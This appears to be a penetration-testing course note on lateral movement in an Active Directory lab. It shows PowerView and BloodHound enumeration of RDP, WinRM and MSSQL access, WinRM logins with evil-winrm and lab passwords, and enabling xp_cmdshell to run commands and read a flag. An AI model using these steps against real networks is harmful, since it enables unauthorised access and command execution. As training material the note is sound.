### Content
- [RDP](#rdp)
- [WinRM](#winrm)
---

> [!Note]
>  If we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.
>  
>  If we don't yet have local admin rights on any hosts, there are:
>  - RDP
>  - [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2)
>  - MSSQL Server 
>
> We can enumerate this access in various ways. BloodHound, PowerView, built-in tools as the following edges exist to show us what types of remote access privileges a given user has:
>  - [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
>  - [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
>  - [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

---
# RDP

Enumerating the Remote Desktop Users Group using PowerView on a host.

``` Powershell
PS C:\> Get-NetLocalGroupMember -ComputerName MS01 -GroupName "Remote Desktop Users"

ComputerName : MS01
GroupName    : Remote Desktop Users
MemberName   : DOMAIN\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN


# From the information above, all Domain Users (meaning all users in the domain) can RDP to this host.
```

Enumerating the Remote Desktop Users Group on Every Host using PowerView

``` Powershell
PS C:\> Get-ADComputer -Filter * | Select-Object -ExpandProperty SamAccountName > ad_computers.txt
PS C:\> foreach($line in [System.IO.File]::ReadLines("ad_computers.txt")) {Get-NetLocalGroupMember -ComputerName "$($line.TrimEnd('$'))" -GroupName "Remote Desktop Users"}
```

##### BloodHound

- Choose the `Domain Users's group` node and check its execution rights. 
- Run the pre-built queries `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`.

> To test this access, we can either use a tool such as `xfreerdp` or `Remmina` from our VM or the Pwnbox or `mstsc.exe` if attacking from a Windows host.

---

# WinRM

Enumerating the Remote Management Users Group on a Host using PowerView
``` PowerShell
PS C:\> Get-NetLocalGroupMember -ComputerName MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

Enumerating the Remote Management Users Group on Every Host using PowerView
``` PowerShell
PS C:\> Get-ADComputer -Filter * | Select-Object -ExpandProperty SamAccountName > ad_computers.txt
PS C:\> foreach($line in [System.IO.File]::ReadLines("ad_computers.txt")) {Get-NetLocalGroupMember -ComputerName "$($line.TrimEnd('$'))" -GroupName "Remote Management Users"}
```
##### BloodHound
Utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access.
``` Cypher

MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

> To test this access form Windows host, use [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) cmdlet using PowerShell and use [evil-winrm](https://github.com/Hackplayers/evil-winrm) from Linux host.

Establishing WinRM Session from Windows
``` PowerShell
PS C:\> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```
Establishing WinRM Session from Linux
``` bash
$ evil-winrm -i 10.129.201.234 -u forend
```

---
# SQL Server Admin

If we have compromised a user or service account with sysadmin privileges on a given SQL server instance.

Enumerating MSSQL Instances with PowerUpSQL.
``` PowerShell
PS C:\> Import-Module .\PowerUpSQL.ps1
PS C:\> Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```
##### BloodHound
use this custom Cypher query to search users and service accounts set up with sysadmin privileges on a given SQL server instance.
``` Cypher

MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

> To test this access, use `PowerUpSQL` module in windows and `mssqlclient` in linux.

PowerUpSQL > [command cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet).

``` PowerShell

PS C:\> Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

mssqlclient

``` bash
$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

SQL> enable_xp_cmdshell
SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
```
